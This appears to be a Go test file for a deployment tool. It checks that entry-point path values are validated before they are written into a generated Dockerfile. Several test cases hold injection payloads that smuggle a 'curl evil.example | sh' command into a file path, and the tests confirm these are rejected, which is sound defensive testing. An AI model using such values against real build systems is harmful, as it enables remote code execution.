// Copyright 2025 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package agentengine

import (
	"fmt"
	"os"
	"strings"
	"testing"
)

func resetFlags(t *testing.T, entryPointPath string) {
	t.Helper()
	saved := flags
	t.Cleanup(func() { flags = saved })

	flags = deployAgentEngineFlags{}
	flags.source.entryPointPath = entryPointPath
	flags.build.tempDir = t.TempDir()
}

// allowListRejection is the part of the ValidateShellArgSafe rejection message
// that no other validator produces. The tests below match on it rather than on
// the label, because "entry point" is also a substring of the pre-existing
// StripExtension wrapper ("cannot strip '.go' extension from entry point path
// '%v'"): a payload edited to drop the .go extension would then satisfy a
// label-only assertion while saying nothing about the allow-list. It names the
// two reasons rather than the rejection itself, because the shorter sentence
// ("not allowed in a value embedded in generated Dockerfile content") is in
// ValidateDockerfileSafe's message too, and matching that would let a value
// that reaches the RUN line be downgraded to the weaker check unnoticed.
const allowListRejection = "whitespace splits COPY operands and shell metacharacters are live in a RUN line"

func TestComputeFlags_RejectsUnsafeEntryPointBasename(t *testing.T) {
	// The basename (with .go stripped) becomes f.build.execFile, embedded
	// directly into the generated Dockerfile's RUN/COPY/CMD lines. The benign
	// directory component is what makes the assertions below able to tell the
	// derived executable name apart from the raw flag value: without it the
	// two strings are byte-identical.
	maliciousEntryPoint := "cmd/quickstart/main\"\nRUN curl evil.example | sh\n#.go"
	resetFlags(t, maliciousEntryPoint)

	err := flags.computeFlags()
	if err == nil {
		t.Fatal("computeFlags() = nil, want an error rejecting the unsafe entry point basename")
	}
	if !strings.Contains(err.Error(), allowListRejection) {
		t.Errorf("computeFlags() error = %v, want the allow-list rejection %q", err, allowListRejection)
	}
	// The checked value is derived, so the message has to carry the flag and the
	// value as typed for the user to be able to find it in their command line.
	if want := fmt.Sprintf("derived from --entry_point_path %q", maliciousEntryPoint); !strings.Contains(err.Error(), want) {
		t.Errorf("computeFlags() error = %v, want it to contain %s", err, want)
	}
}

// TestComputeFlags_RejectsUnsafeOrigEntryPointPath covers the raw
// --entry_point_path value, captured before any path processing. execFile, by
// contrast, is derived only from the basename of that path, so a malicious
// directory component does not affect it. Both payloads keep the basename clean
// ("main.go", so the ".go"-extension strip and the execFile check both succeed)
// while the directory component carries shell metacharacters straight into the
// Dockerfile's `RUN ... -o execFile origEntryPointPath` line.
func TestComputeFlags_RejectsUnsafeOrigEntryPointPath(t *testing.T) {
	for name, maliciousEntryPoint := range map[string]string{
		"metacharacters in a directory component": "a;curl evil.example|sh#/main.go",
		// The second payload is the reason the check has to read the value as
		// typed rather than any processed form of it. filepath.Abs cleans the
		// ".." away, so f.source.srcBasePath no longer contains the "a;b"
		// component, while the RUN line is still emitted from the raw value and
		// still gets the ';'. A check moved onto srcBasePath accepts this.
		"metacharacters cleaned out of the processed path": "./a;b/../main.go",
	} {
		t.Run(name, func(t *testing.T) {
			resetFlags(t, maliciousEntryPoint)

			err := flags.computeFlags()
			if err == nil {
				t.Fatal("computeFlags() = nil, want an error rejecting the unsafe --entry_point_path value")
			}
			if !strings.Contains(err.Error(), allowListRejection) {
				t.Errorf("computeFlags() error = %v, want the allow-list rejection %q", err, allowListRejection)
			}
			// On the value as typed: pinning the label alone would leave the
			// check free to move onto a processed form of the path under an
			// unchanged message.
			if want := fmt.Sprintf("--entry_point_path %q", maliciousEntryPoint); !strings.Contains(err.Error(), want) {
				t.Errorf("computeFlags() error = %v, want the raw-value check to fire and report %s", err, want)
			}
			// And that it is the raw-flag check rather than the
			// derived-executable-name one above it. That one's label embeds the
			// raw flag value too ("executable name derived from
			// --entry_point_path %q:"), so the assertion above matches either
			// message and cannot tell the two checks apart on its own.
			if strings.Contains(err.Error(), "derived from") {
				t.Errorf("computeFlags() error = %v, want the raw --entry_point_path check to fire, not the derived executable name one", err)
			}
		})
	}
}

func TestComputeFlags_AcceptsBenignValues(t *testing.T) {
	resetFlags(t, "main.go")

	if err := flags.computeFlags(); err != nil {
		t.Fatalf("computeFlags() = %v, want no error for benign values", err)
	}
	if flags.build.execFile != "main" {
		t.Errorf("execFile = %q, want %q", flags.build.execFile, "main")
	}
	// Deriving execFile above os.MkdirTemp is what keeps a rejected invocation
	// from leaving a temp dir behind, and it leaves the paths that resolve
	// against the created directory as the only thing below it. Nothing in this
	// package reads execPath, since the build runs in the builder stage rather
	// than on the host, so the two that have to land inside the temp dir are
	// the ones createArchive writes and tars.
	for name, p := range map[string]string{
		"dockerfileBuildPath": flags.build.dockerfileBuildPath,
		"archivePath":         flags.build.archivePath,
	} {
		if !strings.HasPrefix(p, flags.build.tempDir+"/") {
			t.Errorf("%s = %q, want it inside the created temp dir %q", name, p, flags.build.tempDir)
		}
	}
}

// TestComputeFlags_AcceptsNonASCIIEntryPoint guards the deliberate decision to
// let the shell-arg allowlist admit non-ASCII runes. Every byte of a multi-byte
// UTF-8 rune is >= 0x80 and every shell metacharacter is ASCII, so admitting
// them costs nothing in safety, while rejecting them would fail deploys whose
// --entry_point_path merely passes through a non-ASCII directory name.
func TestComputeFlags_AcceptsNonASCIIEntryPoint(t *testing.T) {
	resetFlags(t, "agentes/café/agenté.go")

	if err := flags.computeFlags(); err != nil {
		t.Fatalf("computeFlags() = %v, want no error for a non-ASCII entry point path", err)
	}
	if flags.build.execFile != "agenté" {
		t.Errorf("execFile = %q, want %q", flags.build.execFile, "agenté")
	}
}

// TestComputeFlags_RejectionLeavesNoTempDir pins the ordering of every check
// that can fail against os.MkdirTemp. cleanTemp only runs after a fully
// successful deploy, there is no defer, so a check that fires after the temp
// dir is created leaves an empty agentEngine_<timestamp>_* directory behind on
// every rejected invocation. Nothing above os.MkdirTemp needs the directory;
// the fields that do (execPath, dockerfileBuildPath, archivePath) are all
// assigned below it.
//
// The third case is the one main leaks on today: StripExtension moved above
// os.MkdirTemp with the two validators, and an entry point path with no ".go"
// suffix is the only way to reach it.
func TestComputeFlags_RejectionLeavesNoTempDir(t *testing.T) {
	for name, entryPoint := range map[string]string{
		"unsafe basename":  "main\"\nRUN curl evil.example | sh\n#.go",
		"unsafe directory": "a;curl evil.example|sh#/main.go",
		"no .go extension": "main",
	} {
		t.Run(name, func(t *testing.T) {
			resetFlags(t, entryPoint)
			parent := flags.build.tempDir

			if err := flags.computeFlags(); err == nil {
				t.Fatal("computeFlags() = nil, want an error")
			}
			entries, err := os.ReadDir(parent)
			if err != nil {
				t.Fatalf("cannot read the temp dir parent: %v", err)
			}
			for _, e := range entries {
				t.Errorf("rejected invocation left %q behind in the temp dir parent", e.Name())
			}
		})
	}
}

// TestPrepareDockerfile_EntryPointReachesRUNLine pins the reason
// origEntryPointPath exists at all, and the reason it takes the stronger
// validator: it is the raw --entry_point_path value, not the absolutised one,
// that lands in the builder stage's RUN line. That stage's build context is
// rooted at /app by `COPY . .`, so a host-absolute path there fails every
// deploy. Without this the emitted line is only connected to the field by
// reading the code: moving the capture below the filepath.Abs assignment
// leaves the rest of the suite green. cloudrun ships the symmetric test for
// its CMD array.
func TestPrepareDockerfile_EntryPointReachesRUNLine(t *testing.T) {
	const entryPoint = "cmd/quickstart/main.go"
	resetFlags(t, entryPoint)
	flags.agentEngine.serverPort = 8080

	if err := flags.computeFlags(); err != nil {
		t.Fatalf("computeFlags() = %v, want no error", err)
	}
	if err := flags.prepareDockerfile(); err != nil {
		t.Fatalf("prepareDockerfile() = %v, want no error", err)
	}

	content, err := os.ReadFile(flags.build.dockerfileBuildPath)
	if err != nil {
		t.Fatalf("cannot read the generated Dockerfile: %v", err)
	}
	var runLine string
	for _, line := range strings.Split(string(content), "\n") {
		if rest, ok := strings.CutPrefix(line, "RUN "); ok {
			runLine = rest
		}
	}
	if runLine == "" {
		t.Fatalf("no RUN instruction in the generated Dockerfile:\n%s", content)
	}

	want := "-o " + flags.build.execFile + " " + entryPoint
	if !strings.HasSuffix(runLine, want) {
		t.Errorf("RUN line = %q, want it to end with %q", runLine, want)
	}
}
